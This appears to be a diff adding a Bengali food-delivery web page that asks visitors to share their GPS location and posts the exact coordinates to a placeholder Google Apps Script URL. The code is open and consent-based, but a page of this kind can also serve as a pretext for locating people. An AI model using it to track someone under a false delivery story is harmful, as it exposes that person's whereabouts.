@@ -1,1 +1,152 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ডেলিভারি লোকেশন শেয়ার করুন</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f7f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 15px;
+    }
+    .card {
+      background: #ffffff;
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #666;
+      font-size: 15px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    button {
+      background-color: #e65100;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #bf360c;
+    }
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+    .success { color: #2e7d32; }
+    .error { color: #c62828; }
+    .loading { color: #ef6c00; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2>📍 ডেলিভারি লোকেশন</h2>
+  <p>সঠিক সময়ে আপনার খাবার পৌঁছে দিতে নিচের বাটনে চাপ দিয়ে আপনার বর্তমান GPS লোকেশন শেয়ার করুন।</p>
+  
+  <button id="shareBtn" onclick="getLocation()">Share My Location</button>
+  
+  <div id="status"></div>
+</div>
+
+<script>
+  // নিচের কোটেশনের ভেতরে আপনার কপি করা Google Apps Script Web App URL বসান
+  const SCRIPT_URL = "YOUR_WEB_APP_URL_HERE";
+
+  function getLocation() {
+    const statusDiv = document.getElementById("status");
+    const btn = document.getElementById("shareBtn");
+
+    if (!navigator.geolocation) {
+      statusDiv.innerHTML = "<span class='error'>দুঃখিত, আপনার ব্রাউজার GPS সাপোর্ট করে না।</span>";
+      return;
+    }
+
+    btn.disabled = true;
+    statusDiv.innerHTML = "<span class='loading'>আপনার লোকেশন খোঁজা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</span>";
+
+    navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    });
+  }
+
+  function sendPosition(position) {
+    const statusDiv = document.getElementById("status");
+    const btn = document.getElementById("shareBtn");
+    
+    const payload = {
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude
+    };
+
+    statusDiv.innerHTML = "<span class='loading'>লোকেশন পাঠানো হচ্ছে...</span>";
+
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(() => {
+      statusDiv.innerHTML = "<span class='success'>✅ ধন্যবাদ! আপনার বর্তমান লোকেশন সফলভাবে আমাদের কাছে পৌঁছেছে।</span>";
+      btn.innerText = "Location Shared";
+    })
+    .catch((error) => {
+      statusDiv.innerHTML = "<span class='error'>❌ লোকেশন পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।</span>";
+      btn.disabled = false;
+    });
+  }
+
+  function showError(error) {
+    const statusDiv = document.getElementById("status");
+    const btn = document.getElementById("shareBtn");
+    btn.disabled = false;
+
+    switch(error.code) {
+      case error.PERMISSION_DENIED:
+        statusDiv.innerHTML = "<span class='error'>❌ আপনি লোকেশন পারমিশন দেননি। অনুগ্রহ করে ব্রাউজার থেকে Location Allow করুন।</span>";
+        break;
+      case error.POSITION_UNAVAILABLE:
+        statusDiv.innerHTML = "<span class='error'>❌ আপনার ফোনের GPS বা লোকেশন বন্ধ আছে। সেটি চালু করে আবার চেষ্টা করুন।</span>";
+        break;
+      case error.TIMEOUT:
+        statusDiv.innerHTML = "<span class='error'>❌ লোকেশন পেতে বেশি সময় লাগছে। আবার চেষ্টা করুন।</span>";
+        break;
+      default:
+        statusDiv.innerHTML = "<span class='error'>❌ অজানা একটি সমস্যা হয়েছে।</span>";
+    }
+  }
+</script>
+
+</body>
+                                                                                      </html>
 
